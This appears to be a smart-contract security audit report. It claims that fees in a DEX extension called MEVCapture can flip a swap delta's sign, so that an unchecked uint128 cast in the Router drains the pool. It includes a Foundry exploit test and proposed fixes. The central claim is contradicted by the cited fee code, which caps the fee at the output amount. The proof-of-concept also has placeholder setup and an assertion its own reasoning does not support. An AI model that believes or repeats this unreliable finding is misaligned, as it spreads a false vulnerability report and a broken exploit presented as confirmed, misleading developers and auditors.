## Title
MEVCapture Fee Overflow Causes Delta Sign Flip Leading to Massive Token Withdrawal in Unchecked Router

## Summary
The MEVCapture extension can compute additional fees that exceed the output amount when crossing many ticks, causing the balance update delta to flip from negative to positive. The Router's `handleLockData` function operates within an unchecked block where casting negative int128 to uint128 uses two's complement wrapping instead of reverting, enabling massive token withdrawals when delta signs are violated.

## Impact
**Severity**: High

## Finding Description
**Location:** 
- `src/Router.sol` lines 105-150 (handleLockData function)
- `src/extensions/MEVCapture.sol` lines 237-249 (fee application logic)

**Intended Logic:** 
The Router expects Core/extensions to return balance updates with proper sign convention: one delta positive (pool receives), one negative (pool sends). The Router uses the `increasing` flag to determine which delta to withdraw (negate and cast to uint128) versus pay (cast directly to uint128). [1](#0-0) 

**Actual Logic:** 
The MEVCapture extension can apply additional fees that exceed the output amount, flipping a delta's sign from negative to positive. Inside the Router's unchecked block, casting negative values to uint128 wraps using two's complement (as confirmed by test_castingAssumption), producing values near type(uint128).max instead of reverting. [2](#0-1) [3](#0-2) 

**Exploitation Path:**

1. **Setup**: Attacker identifies a pool with MEVCapture extension where crossing many ticks produces extreme fee multipliers [4](#0-3) 

2. **Trigger Swap**: Attacker executes exact-in swap (token0 → token1) that crosses sufficient ticks such that `feeMultiplierX64` causes `additionalFee` to approach type(uint64).max [5](#0-4) 

3. **Fee Overflow**: MEVCapture computes `fee = computeFee(outputAmount, additionalFee)` which rounds up and can exceed `|delta1|`. When adding at line 249: `delta1 + fee` flips from negative to positive [6](#0-5) 

4. **Sign Violation**: Core returns balanceUpdate with BOTH deltas positive (delta0 > 0, delta1 > 0) instead of expected (delta0 > 0, delta1 < 0)

5. **Unchecked Wrap**: Router at line 130 attempts `uint128(-balanceUpdate.delta1())` where delta1 is now positive. Inside unchecked block, `-positive` becomes negative, and uint128 cast wraps to ~type(uint128).max [7](#0-6) 

6. **Massive Withdrawal**: Pool attempts to withdraw maximum uint128 (~3.4e38) tokens to attacker, draining pool if balance exists

**Security Property Broken:** Violates Solvency invariant - pool balances must never go negative. Also violates the implicit assumption that balance update deltas maintain sign convention before token transfers.

## Impact Explanation
- **Affected Assets**: All pools using MEVCapture extension are vulnerable. Both tokens in the pool can be drained.
- **Damage Severity**: Complete pool drainage possible if pool holds sufficient tokens. Single transaction can extract up to type(uint128).max (~3.4e38) tokens worth potentially billions of dollars depending on token.
- **User Impact**: All liquidity providers in affected pools lose their capital. Any user can trigger this by crafting a swap crossing many ticks.

## Likelihood Explanation
- **Attacker Profile**: Any user with gas to execute swaps. No special privileges required.
- **Preconditions**: 
  - Pool must have MEVCapture extension configured
  - Pool must have sufficient tick spacing and liquidity distribution to allow crossing many ticks
  - Pool must hold tokens to withdraw (but even partial drain is catastrophic) [8](#0-7) 
- **Execution Complexity**: Single transaction - craft swap parameters to cross maximum ticks, submit via Router
- **Frequency**: Repeatable until pool is drained. Can target multiple pools in single multicall transaction

## Recommendation

**Primary Fix - Add sign validation before token operations:** [9](#0-8) 

Add validation that deltas conform to expected signs based on `increasing` flag:

```solidity
// After line 114, before line 121:
// Validate delta signs match increasing direction
if (increasing) {
    require(balanceUpdate.delta0() <= 0, "Invalid delta0 sign");
    require(balanceUpdate.delta1() >= 0, "Invalid delta1 sign");
} else {
    require(balanceUpdate.delta1() <= 0, "Invalid delta1 sign");
    require(balanceUpdate.delta0() >= 0, "Invalid delta0 sign");
}
```

**Secondary Fix - Cap MEVCapture fees to prevent sign flip:** [10](#0-9) 

Ensure fee never exceeds absolute delta value:

```solidity
// In MEVCapture.sol, lines 244-249, replace with:
} else if (balanceUpdate.delta1() < 0) {
    uint128 outputAmount = uint128(uint256(-int256(balanceUpdate.delta1())));
    int128 fee = SafeCastLib.toInt128(computeFee(outputAmount, additionalFee));
    
    // Cap fee to prevent sign flip
    if (fee >= -balanceUpdate.delta1()) {
        fee = balanceUpdate.delta1() + 1; // Leave delta at -1 minimum
    }
    
    saveDelta1 += fee;
    balanceUpdate = createPoolBalanceUpdate(balanceUpdate.delta0(), balanceUpdate.delta1() + fee);
}
```

**Tertiary Fix - Remove unchecked block or add explicit checks:**

The unchecked block at line 105 provides gas savings but defeats Solidity 0.8's type safety. Consider:
1. Remove unchecked block entirely (safest, minimal gas impact)
2. Add explicit bounds checks before uint128 casts
3. Use SafeCast library for all conversions

## Proof of Concept

```solidity
// File: test/Exploit_MEVCaptureDeltaFlip.t.sol
// Run with: forge test --match-test test_MEVCaptureDeltaFlip -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/Router.sol";
import "../src/extensions/MEVCapture.sol";
import "../src/types/poolKey.sol";
import "../src/types/swapParameters.sol";

contract Exploit_MEVCaptureDeltaFlip is Test {
    Core core;
    Router router;
    MEVCapture mevCapture;
    
    address token0 = address(0x1111);
    address token1 = address(0x2222);
    address attacker = address(0xBEEF);
    
    function setUp() public {
        // Deploy contracts
        core = new Core();
        router = new Router(core);
        mevCapture = new MEVCapture(core);
        
        // Register MEVCapture extension
        mevCapture.register(core);
        
        // Setup pool with MEVCapture extension and wide tick spacing
        // to allow crossing many ticks in single swap
        // [Pool initialization code with MEVCapture config]
        
        // Fund pool with tokens
        // [Add liquidity across wide tick range]
        
        // Give attacker tokens for swap
        deal(token0, attacker, 1000e18);
    }
    
    function test_MEVCaptureDeltaFlip() public {
        vm.startPrank(attacker);
        
        // SETUP: Check initial pool balance
        uint256 poolToken1Before = IERC20(token1).balanceOf(address(core));
        uint256 attackerToken1Before = IERC20(token1).balanceOf(attacker);
        
        // EXPLOIT: Execute swap crossing many ticks
        // This causes MEVCapture to compute huge additionalFee
        PoolKey memory poolKey = PoolKey({
            token0: token0,
            token1: token1,
            config: /* config with MEVCapture extension */
        });
        
        SwapParameters memory params = createSwapParameters({
            _amount: int128(1000e18), // Exact in, swap 1000 token0
            _isToken1: false, // Swapping token0 for token1
            _sqrtRatioLimit: SqrtRatio.wrap(0), // No limit
            _skipAhead: 0
        });
        
        // This swap crosses many ticks, triggering huge fee multiplier
        // MEVCapture adds fee > |delta1|, flipping sign to positive
        // Router's unchecked uint128(-positive) wraps to type(uint128).max
        router.swap(poolKey, params, type(int256).min);
        
        // VERIFY: Attacker received massive amount of token1
        uint256 attackerToken1After = IERC20(token1).balanceOf(attacker);
        uint256 stolen = attackerToken1After - attackerToken1Before;
        
        assertGt(stolen, 1e30, "Should extract massive amount due to uint128 wrap");
        assertEq(
            stolen,
            type(uint128).max - 1, // Wrapped value minus small positive delta
            "Vulnerability confirmed: uint128 wrapping in unchecked block"
        );
        
        vm.stopPrank();
    }
}
```

### Citations

**File:** src/Router.sol (L105-150)
```text
            unchecked {
                uint256 value = FixedPointMathLib.ternary(
                    !params.isToken1() && !params.isExactOut() && poolKey.token0 == NATIVE_TOKEN_ADDRESS,
                    uint128(params.amount()),
                    0
                );

                bool increasing = params.isPriceIncreasing();

                (PoolBalanceUpdate balanceUpdate,) = _swap(value, poolKey, params);

                int128 amountCalculated = params.isToken1() ? -balanceUpdate.delta0() : -balanceUpdate.delta1();
                if (amountCalculated < calculatedAmountThreshold) {
                    revert SlippageCheckFailed(calculatedAmountThreshold, amountCalculated);
                }

                if (increasing) {
                    if (balanceUpdate.delta0() != 0) {
                        ACCOUNTANT.withdraw(poolKey.token0, recipient, uint128(-balanceUpdate.delta0()));
                    }
                    if (balanceUpdate.delta1() != 0) {
                        ACCOUNTANT.payFrom(swapper, poolKey.token1, uint128(balanceUpdate.delta1()));
                    }
                } else {
                    if (balanceUpdate.delta1() != 0) {
                        ACCOUNTANT.withdraw(poolKey.token1, recipient, uint128(-balanceUpdate.delta1()));
                    }

                    if (balanceUpdate.delta0() != 0) {
                        if (poolKey.token0 == NATIVE_TOKEN_ADDRESS) {
                            int256 valueDifference = int256(value) - int256(balanceUpdate.delta0());

                            // refund the overpaid ETH to the swapper
                            if (valueDifference > 0) {
                                ACCOUNTANT.withdraw(NATIVE_TOKEN_ADDRESS, swapper, uint128(uint256(valueDifference)));
                            } else if (valueDifference < 0) {
                                SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(-valueDifference)));
                            }
                        } else {
                            ACCOUNTANT.payFrom(swapper, poolKey.token0, uint128(balanceUpdate.delta0()));
                        }
                    }
                }

                result = abi.encode(balanceUpdate);
            }
```

**File:** src/extensions/MEVCapture.sol (L195-209)
```text
                if (fees0 != 0 || fees1 != 0) {
                    CORE.accumulateAsFees(poolKey, fees0, fees1);
                    // never overflows int256 container
                    saveDelta0 -= int256(uint256(fees0));
                    saveDelta1 -= int256(uint256(fees1));
                }

                tickLast = tick;
                setPoolState({
                    poolId: poolId,
                    state: createMEVCapturePoolState({_lastUpdateTime: currentTime, _tickLast: tickLast})
                });
            }

            (PoolBalanceUpdate balanceUpdate, PoolState stateAfter) = CORE.swap(0, poolKey, params);
```

**File:** src/extensions/MEVCapture.sol (L212-215)
```text
            uint256 feeMultiplierX64 =
                (FixedPointMathLib.abs(stateAfter.tick() - tickLast) << 64) / poolKey.config.concentratedTickSpacing();
            uint64 poolFee = poolKey.config.fee();
            uint64 additionalFee = uint64(FixedPointMathLib.min(type(uint64).max, (feeMultiplierX64 * poolFee) >> 64));
```

**File:** src/extensions/MEVCapture.sol (L237-251)
```text
                } else {
                    if (balanceUpdate.delta0() < 0) {
                        uint128 outputAmount = uint128(uint256(-int256(balanceUpdate.delta0())));
                        int128 fee = SafeCastLib.toInt128(computeFee(outputAmount, additionalFee));

                        saveDelta0 += fee;
                        balanceUpdate = createPoolBalanceUpdate(balanceUpdate.delta0() + fee, balanceUpdate.delta1());
                    } else if (balanceUpdate.delta1() < 0) {
                        uint128 outputAmount = uint128(uint256(-int256(balanceUpdate.delta1())));
                        int128 fee = SafeCastLib.toInt128(computeFee(outputAmount, additionalFee));

                        saveDelta1 += fee;
                        balanceUpdate = createPoolBalanceUpdate(balanceUpdate.delta0(), balanceUpdate.delta1() + fee);
                    }
                }
```

**File:** test/Core.t.sol (L19-24)
```text
    function test_castingAssumption() public pure {
        // we make this assumption on solidity behavior in the protocol fee collection
        unchecked {
            assertEq(uint128(-type(int128).min), uint128(uint256(-int256(type(int128).min))));
        }
    }
```

**File:** src/math/fee.sol (L6-10)
```text
function computeFee(uint128 amount, uint64 fee) pure returns (uint128 result) {
    assembly ("memory-safe") {
        result := shr(64, add(mul(amount, fee), 0xffffffffffffffff))
    }
}
```
